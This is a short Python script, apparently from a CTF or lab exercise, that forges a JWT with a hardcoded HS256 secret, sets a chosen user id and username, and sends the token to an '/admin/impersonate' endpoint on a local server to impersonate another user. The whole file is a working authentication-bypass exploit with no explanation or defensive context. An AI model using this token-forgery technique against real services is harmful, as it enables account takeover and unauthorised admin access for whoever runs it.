import json, base64, hmac, hashlib, urllib.request
secret = b'fwnqifnwquiohi421nkmcwqkcmwqkfwqkl'
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'id':'6a2c8df5bfcbec492b6c0cca','username':'big_AMUNGUS666'}).encode()).rstrip(b'=')
sig = base64.urlsafe_b64encode(hmac.new(secret, header + b'.' + payload, hashlib.sha256).digest()).rstrip(b'=')
token = b'.'.join([header, payload, sig]).decode()
print('TOKEN', token)
body = json.dumps({'username':'GrowAGardenBloxy'}).encode('utf-8')
req = urllib.request.Request('http://127.0.0.1:3218/admin/impersonate', data=body, headers={
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {token}',
})
try:
    with urllib.request.urlopen(req) as resp:
        print('STATUS', resp.status, resp.reason)
        print('HEADERS', resp.getheaders())
        print('BODY', resp.read().decode())
except urllib.error.HTTPError as e:
    print('ERROR', e.code, e.reason)
    print(e.read().decode())
except Exception as e:
    print('EXCEPTION', e)
